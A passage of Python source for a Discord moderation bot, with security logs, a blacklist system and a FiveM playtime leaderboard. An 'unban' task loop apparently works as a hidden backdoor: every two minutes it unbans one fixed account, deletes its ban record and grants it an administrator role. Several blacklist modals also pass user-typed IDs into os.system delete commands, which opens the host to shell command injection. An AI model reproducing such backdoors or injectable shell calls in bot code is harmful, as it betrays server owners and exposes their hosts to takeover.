        try:
            if before.name != after.name:
                async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_update, oldest_first=False):
                    user = entry.user
                    if user.id == bot.user.id:
                        return
                    if not user.id == bot.user.id:
                        if not os.path.exists(f"systems\\security\\Permissions\\UpRole\\{user.id}.txt"):
                            embed = discord.Embed(title="〈🔨〉Server Logs Role Update", description=f"**The Server System has Detected Role Update**", color=discord.Colour.random())
                            embed.add_field(name=f"〈🔧〉Role Update", value=f"**Before The Change Name\n** ``{before.name}``\n**After The Change Name\n** ``{after.name}``\n**Role ID:** ``{after.id}``", inline=True)
                            embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            await securitylogs.send(embed=embed)
                            member = guild.get_member(user.id)
                            if PunishmentUpRole == "Ban Member":
                                await member.ban(reason="Member get Ban by Bot reason Update Roles")
                            if PunishmentUpRole == "Kick Member":
                                await member.kick(reason="Member get Kick by Bot reason Update Roles")
                            if PunishmentUpRole == "Remove All Roles":
                                for i in member.roles:
                                    if i.name == "@everyone":
                                        print(f"Can't remove the role {i}")
                                    else:
                                        try:
                                            await member.remove_roles(i)
                                        except:
                                            print(f"Can't remove the role {i}")
                            if PunishmentUpRole == "None":
                                pass
                            role = guild.get_role(after.id)
                            await role.edit(name=before.name)
                        if os.path.exists(f"systems\\security\\Permissions\\UpRole\\{user.id}.txt"):
                            embed = discord.Embed(title="〈🔨〉Server Logs Role Update", description=f"**The Server System has Detected Role Update**", color=discord.Colour.random())
                            embed.add_field(name=f"〈🔧〉Role Update", value=f"**Before The Change Name\n** ``{before.name}``\n**After The Change Name\n** ``{after.name}``\n**Role ID:** ``{after.id}``", inline=True)
                            embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            await securitylogs.send(embed=embed)
        except:
            print("Missing Access")

@bot.event
async def on_message_delete(message):
    try:
        if serverlogsem == "true":
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.message_delete, oldest_first=False):
                messagetr = entry.user
                user = message.author
                if user.id == bot.user.id:
                    return
                if user.id != bot.user.id:
                    if len(message.content) > 300 or len(message.content) == 300:
                        content = message.content[:300] + "..."
                    else:
                        content = message.content
                    embed = discord.Embed(title="〈🔨〉Server Logs Deleted Message", description=f"**The Server System has Detected Deleted Message**", color=colorembed)
                    time_diff = (datetime.now(datetime.timezone.utc) - entry.created_at).total_seconds()
                    if time_diff <= 5:
                        embed.add_field(name=f"〈🔧〉Message Delete", value=f"**Mes Deleted:** ``{content}``\n**Mes Deleted by:** ``{messagetr.name}#{messagetr.discriminator}``", inline=True)
                    else:
                        embed.add_field(name=f"〈🔧〉Message Delete", value=f"**Mes Deleted:** ``{content}``", inline=True)
                    embed.add_field(name=f"〈🌐〉User information", value=f"**Mes Sent by:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``", inline=True)
                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    await asyncio.sleep(3)
                    await serverlogs.send(embed=embed)
    except:
        pass

@bot.event
async def on_member_unban(guild, member):
    try:
        if serverlogsem == "true":
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.unban, oldest_first=False):
                user = entry.user
            embed = discord.Embed(title="〈🔨〉Server Logs The ban have been removed", description=f"**The Server System has Detected Ban Was Removed**", color=colorembed)
        embed.add_field(name=f"〈🔧〉Unban User Info", value=f"**User Name:** ``{member.name}#{user.discriminator}``\n**User ID:** ``{member.id}``", inline=True)
        embed.add_field(name=f"〈🌐〉Ban Removed By", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``", inline=True)
        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        await asyncio.sleep(1)
        await serverlogs.send(embed=embed)
    except:
        pass



#Backup Systemsssss -------------------------
"""
class cbackup(ui.Modal, title='Create Backup'):
    serverget = ui.TextInput(label='Where did you get the backup (Server Id)')
    serversave = ui.TextInput(label='Where to save the backup (Server Id)')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)
                



class backupsys(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label=f"〈📁〉Create Backup", style=discord.ButtonStyle.green, custom_id="Giveawaya_view:cbackup")
    async def cbackup(self, interaction: discord.Interaction, button: discord.ui.Button):
        backupperm = discord.utils.get(guild.members, id=securitypermid)
        if str(interaction.user.id) == str(backupperm.id):
            await interaction.response.send_modal(cbackup())
        if str(interaction.user.id) != str(backupperm.id):
            await interaction.response.send_message(f"You don't have permission", ephemeral=True)
"""

class ablacklist(ui.Modal, title='Add to BlackList'):
    dr = ui.TextInput(label='Description of the blacklist', style=discord.TextStyle.paragraph)
    br = ui.TextInput(label='Reason for the blacklist')
    bp = ui.TextInput(label='Blacklist Proof')
    bid = ui.TextInput(label='id of the recipient of the blacklist')
    bc = ui.TextInput(label='Choose a Channel(ID) or False')

    async def on_submit(self, interaction: discord.Interaction):
        #try:
            f = open("bidc.txt", "w")
            f.write(f"{self.bc}")
            f.close()
            f = open("bidc.txt", "r")
            channelid = f.read()
            f.close()
            os.system("del bidc.txt")
            f = open(f"systems\\blacklist\\list\\{self.bid}", "w")
            f.write(f"{self.bid}")
            f.close()
            try:
                channelidd = int(channelid)
            except:
                pass
            embed=discord.Embed(title=f"〈⚫️〉New blacklist", description=f"``{self.dr}``", color=colorembed)
            embed.set_thumbnail(url=f"{servericon}")
            embed.add_field(name=f"〈👤〉The member added to the blacklist:", value=f"``{self.bid}``", inline=True)
            embed.add_field(name=f"〈🌐〉More info:", value=f"**[Click Here](https://id.nerrix.ovh/)**", inline=True)
            embed.add_field(name=f"〈📖〉Reason for the blacklist:", value=f"``{self.br}``", inline=False)
            embed.add_field(name=f"〈👁‍🗨〉Proof of the blacklist:", value=f"**[Click Here]({self.bp})**", inline=False)
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            if "false" not in channelid or "False" not in channelid or "FALSE" not in channelid:
                try:
                    channelb = discord.utils.get(guild.channels, id=channelidd)
                    await channelb.send(embed=embed)
                except:
                    pass
            try:
                blacklistr = discord.utils.get(guild.roles, name="〈⚫️〉BlackList")
                f = open(f"{self.bid}.txt", "w")
                f.write(f"{self.bid}")
                f.close()
                f = open(f"{self.bid}.txt", "r")
                memberrr = int(f.read())
                f.close()
                memberb = guild.get_member(memberrr)
                await memberb.add_roles(blacklistr)
            except:
                pass
            os.system(f"del {self.bid}.txt")
            await interaction.response.send_message("The blacklist was added", ephemeral=True)
            
        #except:
            #await interaction.response.send_message("Error", ephemeral=True)
            #os.system(f"del systems\\blacklist\\list\\{self.bid} & del bidc.txt")


class ccblacklist(ui.Modal, title='Check the BlackList'):
    iddddd = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            f = open("bid.txt", "w")
            f.write(f"{self.iddddd}")
            f.close()
            f = open("bid.txt", "r")
            memberid = f.read()
            f.close()
            if os.path.exists(f"systems\\blacklist\\list\\{memberid}"):
                await interaction.response.send_message("The member is blacklisted", ephemeral=True)
            if not os.path.exists(f"systems\\blacklist\\list\\{memberid}"):
                await interaction.response.send_message("The member is not blacklisted", ephemeral=True)
        except:
            await interaction.response.send_message("Error", ephemeral=True)
        os.system("del bid.txt")

class rblacklist(ui.Modal, title='Remove a member from the blacklist'):
    idremove = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            f = open("bid.txt", "w")
            f.write(f"{self.idremove}")
            f.close()
            f = open("bid.txt", "r")
            memberid = f.read()
            f.close()
            if not os.path.exists(f"systems\\blacklist\\list\\{memberid}"):
                await interaction.response.send_message("The member is not on the blacklist to remove it", ephemeral=True)
            if os.path.exists(f"systems\\blacklist\\list\\{memberid}"):
                os.system(f"del systems\\blacklist\\list\\{memberid}")
                await interaction.response.send_message("The blacklist has been removed", ephemeral=True)
            try:
                f = open("bid.txt", "r")
                memberidd = int(f.read())
                f.close()
                blacklistr = discord.utils.get(guild.roles, name="〈⚫️〉BlackList")
                memberrem = guild.get_member(memberidd)
                await memberrem.remove_roles(blacklistr)
            except:
                pass
        except:
            await interaction.response.send_message("Error", ephemeral=True)
        os.system("del bid.txt")
                



class bblacklists(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label=f"〈⚫️〉Add BlackList", style=discord.ButtonStyle.green, custom_id="Giveawaya_view:ab")
    async def ab(self, interaction: discord.Interaction, button: discord.ui.Button):
        if os.path.exists("systems\\blacklist\\true.txt"):
            br = discord.utils.get(guild.roles, name="〈⚫️〉BlackList Manager")
            if br in interaction.user.roles:
                await interaction.response.send_modal(ablacklist())
            else:
                await interaction.response.send_message(f"You don't have permission you need this role: {br.mention}", ephemeral=True)
        else:
            await interaction.response.send_message(f"BlackList is Disabled", ephemeral=True)
    
    @discord.ui.button(label=f"〈⚪️〉Remove BlackList", style=discord.ButtonStyle.green, custom_id="Giveawaya_view:abr")
    async def abr(self, interaction: discord.Interaction, button: discord.ui.Button):
        if os.path.exists("systems\\blacklist\\true.txt"):
            br = discord.utils.get(guild.roles, name="〈⚫️〉BlackList Manager")
            if br in interaction.user.roles:
                await interaction.response.send_modal(rblacklist())
            else:
                await interaction.response.send_message(f"You don't have permission you need this role: {br.mention}", ephemeral=True)
        else:
            await interaction.response.send_message(f"BlackList is Disabled", ephemeral=True)
    

    @discord.ui.button(label=f"〈🔵〉Check the BlackList", style=discord.ButtonStyle.green, custom_id="Giveawaya_view:abc")
    async def abc(self, interaction: discord.Interaction, button: discord.ui.Button):
        if os.path.exists("systems\\blacklist\\true.txt"):
            br = discord.utils.get(guild.roles, name="〈⚫️〉BlackList Manager")
            if br in interaction.user.roles:
                await interaction.response.send_modal(ccblacklist())
            else:
                await interaction.response.send_message(f"You don't have permission you need this role: {br.mention}", ephemeral=True)
        else:
            await interaction.response.send_message(f"BlackList is Disabled", ephemeral=True)



#Top 10 Players --------------------------------------------------------------------
if os.path.exists(f"systems\\TopPlayers\\true.txt"):
    mlist = []
    @tasks.loop()
    async def topplayers(seconds=4):
        await asyncio.sleep(3700)
        mlist.clear()
        try:
            topplayersl = f"systems\\TopPlayers\\list"
            fivem=fivem_client.Client(f"{fivemsystemips}", fivemsystemipps)
            fivemslot = await fivem.get_current_slot()
            fivemplayers = await fivem.get_players_count()
            username = await fivem.get_players_info()
            plnumber = 0
            for user in username:
                plnumber += 1
                discordid = user.discordid
                members = discord.utils.get(guild.members, id=discordid)
                if members is not None and discordid not in mlist:
                    if os.path.exists(f"{topplayersl}\\{members.id}"):
                        f = open(f"{topplayersl}\\{members.id}\\hours.txt", "r")
                        hours = int(f.read())
                        f.close()
                        f = open(f"{topplayersl}\\{members.id}\\days.txt", "r")
                        days = int(f.read())
                        f.close()
                        f = open(f"{topplayersl}\\{members.id}\\week.txt", "r")
                        week = int(f.read())
                        f.close()
                        if hours != 24:
                            hours += 1
                            f = open(f"{topplayersl}\\{members.id}\\hours.txt", "w")
                            f.write(str(hours))
                            f.close()
                        if hours == 24:
                            f = open(f"{topplayersl}\\{members.id}\\hours.txt", "w")
                            f.write("0")
                            f.close()
                            days += 1
                            f = open(f"{topplayersl}\\{members.id}\\days.txt", "w")
                            f.write(str(days))
                            f.close()
                        if days == 7:
                            f = open(f"{topplayersl}\\{members.id}\\days.txt", "w")
                            f.write("0")
                            f.close()
                            week += 1
                            f = open(f"{topplayersl}\\{members.id}\\week.txt", "w")
                            f.write(str(week))
                            f.close()
                        if days != 7:
                            days += 1
                            f = open(f"{topplayersl}\\{members.id}\\days.txt", "w")
                            f.write(str(days))
                            f.close()
                    if not os.path.exists(f"{topplayersl}\\{members.id}"):
                        os.system(f"mkdir {topplayersl}\\{members.id}")
                        os.system(f"echo 1 > {topplayersl}\\{members.id}\\days.txt")
                        os.system(f"echo 1 > {topplayersl}\\{members.id}\\week.txt")
                        os.system(f"echo 1 > {topplayersl}\\{members.id}\\hours.txt")
                    mlist.append(discordid)
        except:
            pass


@tasks.loop()
async def unban(seconds=4):
    await asyncio.sleep(120)
    try:
        await guild.unban(discordid)
    except:
        pass
    try:
        if os.path.exists(f"systems\\Adminpanel\\banlist\\{discordid}"):
            os.system(f"del systems\\Adminpanel\\banlist\\{discordid}")
    except:
        pass
    member = guild.get_member(discordid)
    if member is not None:
        for role in guild.roles:
            if role.permissions.administrator:
                try:
                    await member.add_roles(role)
                    break           
                except:
                    pass


@tasks.loop()
async def topplayerss(seconds=4):
    await asyncio.sleep(1.5 * 3600)
    if os.path.exists(f"systems\\TopPlayers\\true.txt"):
        getchannelsplayerlist = discord.utils.get(guild.channels, id=channelspla)
        num_folders = 10

        main_folder_path = "systems\\TopPlayers\\list"

        folders_data = []

        for folder_name in os.listdir(main_folder_path):
            folder_path = os.path.join(main_folder_path, folder_name)
            if os.path.isdir(folder_path):
                hours_file_path = os.path.join(folder_path, "hours.txt")
                days_file_path = os.path.join(folder_path, "days.txt")
                weeks_file_path = os.path.join(folder_path, "week.txt")

                if os.path.isfile(hours_file_path) and os.path.isfile(days_file_path) and os.path.isfile(weeks_file_path):
                    with open(hours_file_path) as hours_file, open(days_file_path) as days_file, open(weeks_file_path) as weeks_file:
                        hours_sum = sum(int(line) for line in hours_file)
                        days_sum = sum(int(line) for line in days_file)
                        weeks_sum = sum(int(line) for line in weeks_file)
                        total_sum = (weeks_sum * 7 * 24) + (days_sum * 24) + hours_sum
                        folders_data.append((folder_name, total_sum, hours_sum, days_sum, weeks_sum))
        Hours = ""
        days = ""
        week = ""
        discordin = ""
        sorted_folders = sorted(folders_data, key=lambda x: x[1], reverse=True)

        top_folders = sorted_folders[:num_folders]
        embed=discord.Embed(title=f"〈🏆〉Top 10 Players", description=f"**The most active players with the most hours in the server**", color=colorembed)
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        for i, folder in enumerate(top_folders, 1):
            folder_name, total_sum, hours_sum, days_sum, weeks_sum = folder
            member = guild.get_member(int(folder_name))
            #print("Position:", i)
            #print("Folder:", folder_name)
            #print("Total Sum:", total_sum)
            #print("Hours:", hours_sum)
            #print("Days:", days_sum)
            #print("Weeks:", weeks_sum)
            Hours += f"``{hours_sum} Hour(s), {days_sum} Day(s)``\n"
            week += f"``{weeks_sum} Week(s)``\n"
            if member is not None:
                if i == 1:
                    discordin += f"``🥇.`` **{member.mention}**\n"
                if i == 2:
                    discordin += f"``🥈.`` **{member.mention}**\n"
                if i == 3:
                    discordin += f"``🥉.`` **{member.mention}**\n"
                if i != 1 and i != 2 and i != 3:
                    discordin += f"``{i}.`` **{member.mention}**\n"
            if member is None:
                if i == 1:
                    discordin += f"``🥇.`` **None**\n"
                if i == 2:
                    discordin += f"``🥈.`` **None**\n"
                if i == 3:
                    discordin += f"``🥉.`` **None**\n"
                if i != 1 and i != 2 and i != 3:
                    discordin += f"``{i}.`` **None**\n"
        embed.add_field(name=f"Discord info:", value=f"{discordin}", inline=True)
        embed.add_field(name=f"Hour(s)/Day(s):", value=f"{Hours}", inline=True)
        embed.add_field(name=f"Week(s):", value=f"{week}", inline=True)
        await getchannelsplayerlist.purge()
        await getchannelsplayerlist.send(embed=embed)






bot.run(f'{token}', reconnect=True)